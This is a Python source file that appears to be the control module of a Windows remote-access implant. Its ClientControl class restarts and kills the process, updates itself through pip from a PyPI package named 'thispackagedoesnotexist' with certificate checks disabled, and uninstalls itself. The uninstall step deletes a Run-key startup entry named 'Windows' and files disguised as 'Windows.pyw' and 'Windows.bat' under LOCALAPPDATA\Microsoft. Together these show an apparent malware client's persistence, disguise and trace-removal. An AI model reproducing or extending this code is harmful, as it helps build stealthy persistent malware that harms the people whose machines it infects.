import os
import sys
import shutil
import winreg as reg
import subprocess
import http.client
import ssl
import json
import importlib
import thispackagedoesnotexist

class ClientControl:
    @staticmethod
    def restart_self():
        os.execl(sys.executable, sys.executable, *sys.argv)

    @staticmethod
    def shutdown_self():
        os._exit(0)
    
    @staticmethod
    def update_self():
        def get_latest_version(package_name):
            try:
                conn = http.client.HTTPSConnection("pypi.org", context=ssl._create_unverified_context())
                conn.request("GET", f"/pypi/{package_name}/json")
                response = conn.getresponse()
                if response.status == 200:
                    data = response.read().decode("utf-8")
                    conn.close()
                    package_info = json.loads(data)
                    return package_info["info"]["version"]
                else:
                    conn.close()
            except:
                return None

        def update_package(package_name):
            latest_version = get_latest_version(package_name)
            package_name_with_version = f"{package_name}=={latest_version}"
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", package_name_with_version, "--no-cache-dir"])
            importlib.reload(thispackagedoesnotexist)
            return True
        try:
            package_name = "thispackagedoesnotexist"
            return update_package(package_name)
        except Exception:
            return False

    @staticmethod
    def uninstall_self():
        def remove_from_startup_registry():
            key = reg.HKEY_CURRENT_USER
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "Windows"
            
            try:
                with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as registry_key:
                    reg.DeleteValue(registry_key, value_name)
            except FileNotFoundError:
                pass
            except Exception:
                pass

        def remove_files_and_folders(python_library_path, installation_file, bat_file):
            try:
                if os.path.exists(python_library_path):
                    shutil.rmtree(python_library_path)

                if os.path.exists(installation_file):
                    os.remove(installation_file)

                if os.path.exists(bat_file):
                    os.remove(bat_file)

            except Exception:
                pass

        python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python')
        installation_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows.pyw')
        bat_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows.bat')

        remove_from_startup_registry()
        remove_files_and_folders(python_library_path, installation_file, bat_file)
        ClientControl.shutdown_self()